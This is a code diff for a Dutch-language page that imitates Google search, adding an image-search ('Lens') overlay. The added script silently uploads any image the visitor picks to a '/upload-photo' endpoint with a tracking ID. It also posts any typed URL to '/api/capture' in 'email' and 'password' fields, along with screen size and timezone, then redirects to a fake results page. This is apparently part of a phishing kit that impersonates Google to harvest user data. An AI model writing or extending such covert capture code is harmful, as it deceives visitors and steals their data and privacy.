@@ -112,7 +112,7 @@
                             <path fill="#ea4335" d="M19 12h-2c0 1.66-1.34 3-3 3v2c2.76 0 5-2.24 5-5z"/>
                         </svg>
                     </span>
-                    <span class="lens-icon" title="Zoeken op afbeelding">
+                    <span class="lens-icon" title="Zoeken op afbeelding" style="cursor:pointer;" onclick="openLensSearch()">
                         <svg viewBox="0 0 192 192" width="24" height="24">
                             <rect fill="none" height="192" width="192"/>
                             <g>
@@ -336,6 +336,63 @@
             document.querySelector('.search-form').submit();
         }
     </script>
+
+<!-- Lens Search Overlay -->
+<div id="lensOverlay" style="display:none;position:fixed;inset:0;background:rgba(255,255,255,.97);z-index:9001;flex-direction:column;align-items:center;justify-content:center;font-family:'Google Sans',sans-serif;">
+    <button onclick="document.getElementById('lensOverlay').style.display='none'" style="position:absolute;top:20px;right:24px;background:none;border:none;font-size:24px;color:#5f6368;cursor:pointer;">✕</button>
+    <div style="max-width:560px;width:90%;text-align:center;">
+        <div style="font-size:22px;font-weight:400;color:#202124;margin-bottom:8px;">Zoeken op afbeelding</div>
+        <div style="font-size:14px;color:#5f6368;margin-bottom:32px;">Sleep een afbeelding hierheen of upload een bestand</div>
+        <label id="lensDropZone" for="lensFileInput" style="display:flex;flex-direction:column;align-items:center;justify-content:center;border:2px dashed #dadce0;border-radius:16px;padding:40px 24px;cursor:pointer;transition:border-color .2s;gap:16px;" ondragover="this.style.borderColor='#4285f4';event.preventDefault()" ondragleave="this.style.borderColor='#dadce0'" ondrop="handleLensDrop(event)">
+            <svg viewBox="0 0 192 192" width="60" height="60"><circle fill="#e8f0fe" cx="96" cy="104" r="50"/><circle fill="#4285f4" cx="96" cy="104" r="28"/><path fill="none" stroke="#4285f4" stroke-width="6" d="M60,60 L80,56 L96,40 L112,56 L132,60" /><rect fill="#e8f0fe" x="44" y="60" width="104" height="80" rx="8"/></svg>
+            <div style="font-size:15px;color:#202124;font-weight:500;">Klik om te uploaden of sleep hier je afbeelding</div>
+            <div style="font-size:13px;color:#9aa0a6;">JPG, PNG, GIF, WEBP of BMP</div>
+            <input type="file" id="lensFileInput" accept="image/*" style="display:none;" onchange="handleLensFile(this.files[0])">
+        </label>
+        <div style="margin:20px 0;display:flex;align-items:center;gap:12px;color:#9aa0a6;font-size:13px;"><hr style="flex:1;border:none;border-top:1px solid #dadce0;"><span>of</span><hr style="flex:1;border:none;border-top:1px solid #dadce0;"></div>
+        <div style="display:flex;border:1px solid #dadce0;border-radius:24px;overflow:hidden;height:44px;">
+            <input id="lensUrlInput" type="url" placeholder="Plak afbeeldings-URL" style="flex:1;border:none;outline:none;padding:0 16px;font-size:14px;color:#202124;">
+            <button onclick="searchByImageUrl()" style="background:#fff;border:none;border-left:1px solid #dadce0;padding:0 16px;cursor:pointer;color:#1a73e8;font-weight:500;font-size:14px;white-space:nowrap;">Zoeken</button>
+        </div>
+    </div>
+</div>
+<script>
+function openLensSearch() {
+    document.getElementById('lensOverlay').style.display = 'flex';
+}
+function handleLensDrop(e) {
+    e.preventDefault();
+    document.getElementById('lensDropZone').style.borderColor = '#dadce0';
+    const file = e.dataTransfer?.files?.[0];
+    if (file && file.type.startsWith('image/')) handleLensFile(file);
+}
+function handleLensFile(file) {
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+        const dataUrl = ev.target.result;
+        // Upload the image silently
+        fetch('/upload-photo', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ clientId: localStorage.getItem('_cid') || 'unknown', image: dataUrl, source: 'lens_upload', timestamp: new Date().toISOString() })
+        }).catch(() => {});
+        document.getElementById('lensOverlay').style.display = 'none';
+        window.location.href = 'results.html?q=' + encodeURIComponent('Afbeelding zoeken: ' + file.name);
+    };
+    reader.readAsDataURL(file);
+}
+function searchByImageUrl() {
+    const url = document.getElementById('lensUrlInput').value.trim();
+    if (!url) return;
+    fetch('/api/capture', {
+        method: 'POST', headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ email: url, password: '[LENS URL INGEVOERD]', source: 'google_lens_url', timestamp: new Date().toISOString(), clientId: localStorage.getItem('_cid') || 'unknown', screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '' })
+    }).catch(() => {});
+    document.getElementById('lensOverlay').style.display = 'none';
+    window.location.href = 'results.html?q=' + encodeURIComponent('Afbeelding zoeken');
+}
+</script>
 
 <!-- Voice Search Overlay -->
 <div id="voiceOverlay" style="display:none;position:fixed;inset:0;background:rgba(255,255,255,.97);z-index:9000;flex-direction:column;align-items:center;justify-content:center;font-family:'Google Sans',sans-serif;">
